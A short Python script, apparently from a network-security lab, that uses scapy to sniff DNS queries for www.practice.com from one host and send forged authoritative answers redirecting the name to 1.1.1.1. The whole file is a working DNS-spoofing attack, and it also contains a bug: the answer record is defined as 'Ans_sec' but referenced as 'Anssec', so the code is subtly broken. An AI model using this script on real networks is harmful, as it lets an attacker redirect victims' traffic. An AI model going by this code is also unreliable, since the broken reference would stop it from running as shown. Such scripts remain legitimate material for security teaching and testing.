#!/usr/bin/env python3

 
from scapy.all import *

print("ATTACK 1")
print("Navigate to user window\n")
print("Type command - dig www.practice.com\n")

def spoof_dns(pkt):
  if (DNS in pkt and 'www.practice.com' in pkt[DNS].qd.qname.decode('utf-8')):

    print("The packet to be send:\n")

    pkt.show()

    # Swap source IP address and destination IP address
    IP_packet = IP(dst=pkt[IP].src, src=pkt[IP].dst)

    # Swap source port number and destination port number
    UDP_packet = UDP(dport=pkt[UDP].sport, sport=53)

    # Answer Section
    Ans_sec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='1.1.1.1')

    # Constructing DNS packet
    DNS_packet = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=0, arcount=0,
                 an=Anssec)

    # Constructing entire IP packet and send it out
    spoof_packet = IP_packet/UDP_packet/DNS_packet
    
    print("\nSpoofed packet received from attacker's server:\n")

    spoof_packet.show() 
    send(spoof_packet)

# Sniffing UDP query packets and invoking spoof_dns() function.
f = 'udp and src host 10.9.0.5 and dst port 53'
pkt = sniff(iface='br-5b8338aedcce', filter=f, prn=spoof_dns)      
